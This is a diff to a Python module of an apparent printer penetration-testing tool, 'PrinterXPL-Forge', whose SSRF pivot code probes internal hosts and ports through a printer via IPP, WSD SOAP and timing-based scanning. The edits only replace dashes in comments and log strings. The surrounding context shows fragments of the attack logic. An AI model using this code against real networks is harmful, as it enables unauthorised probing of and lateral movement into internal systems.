@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PrinterXPL-Forge — SSRF Pivot / Lateral Movement Module
+PrinterXPL-Forge  -  SSRF Pivot / Lateral Movement Module
 ======================================================
 Uses the printer as a network pivot point to:
   1. Probe internal hosts/ports the attacker cannot reach directly
@@ -16,11 +16,11 @@ Attack chain:
               [SSRF vector]
 
 Vectors implemented:
-  A. IPP print-by-reference       — printer fetches URL as print job data
-  B. WSD SOAP SSRF                — SOAP GET to arbitrary internal host
-  C. Web UI SSRF                  — some printers accept internal URLs for scan-to-email
-  D. Timed SSRF port scanner      — measure response time to infer port open/closed
-  E. DNS rebinding helper         — generate payload for time-of-check attacks
+  A. IPP print-by-reference        -  printer fetches URL as print job data
+  B. WSD SOAP SSRF                 -  SOAP GET to arbitrary internal host
+  C. Web UI SSRF                   -  some printers accept internal URLs for scan-to-email
+  D. Timed SSRF port scanner       -  measure response time to infer port open/closed
+  E. DNS rebinding helper          -  generate payload for time-of-check attacks
 """
 
 # Author    : Andre Henrique (@mrhenrike)
@@ -137,7 +137,7 @@ def ipp_fetch_url(
 
     except requests.Timeout:
         result['timing_ms'] = int((time.monotonic() - t0) * 1000)
-        result['response_hints'].append('timeout — target may be alive (filtered)')
+        result['response_hints'].append('timeout  -  target may be alive (filtered)')
     except Exception as exc:
         result['response_hints'].append(str(exc)[:60])
 
@@ -314,7 +314,7 @@ def discover_internal_hosts(
         host_count  = 2 ** (32 - int(bits)) - 2
         first_host  = base_parts[:3] + [base_parts[3] + 1]
     except Exception:
-        _log.warning("Cannot parse subnet %r — using /24 from printer IP", subnet)
+        _log.warning("Cannot parse subnet %r  -  using /24 from printer IP", subnet)
         parts       = printer_host.rsplit('.', 1)
         first_host  = list(map(int, parts[0].split('.'))) + [1]
         host_count  = 254
@@ -390,7 +390,7 @@ def pivot_audit(
     if verbose:
         print(f"\n  [PIVOT] Lateral movement assessment via {printer_host}")
 
-    # 1. IPP SSRF — probe localhost (printer itself)
+    # 1. IPP SSRF  -  probe localhost (printer itself)
     local_res = ipp_fetch_url(
         printer_host, printer_port, printer_path,
         'http://127.0.0.1:80/', scheme=scheme, timeout=timeout, dry_run=True,
@@ -400,10 +400,10 @@ def pivot_audit(
         results['risk'].append('IPP_SSRF_CAPABLE')
         if verbose:
             print("  [PIVOT] \033[1;31m[VULN]\033[0m IPP print-by-reference SSRF confirmed")
-            print(f"          Printer fetched http://127.0.0.1:80/ — "
+            print(f"          Printer fetched http://127.0.0.1:80/  -  "
                   f"timing={local_res['timing_ms']}ms")
 
-    # 2. WSD SSRF — probe a well-known internal address
+    # 2. WSD SSRF  -  probe a well-known internal address
     gateway = printer_host.rsplit('.', 1)[0] + '.1'
     wsd_res  = wsd_soap_ssrf(printer_host, gateway, 80, '/', timeout)
     results['ssrf_wsd']     = wsd_res
@@ -411,7 +411,7 @@ def pivot_audit(
     if wsd_res['alive'] or (wsd_res['timing_ms'] and wsd_res['timing_ms'] < 3000):
         results['risk'].append('WSD_SSRF_CAPABLE')
         if verbose:
-            print(f"  [PIVOT] WSD SOAP responded — gateway {gateway} probed "
+            print(f"  [PIVOT] WSD SOAP responded  -  gateway {gateway} probed "
                   f"(timing={wsd_res['timing_ms']}ms)")
 
     # 3. Discover alive hosts in the same /24
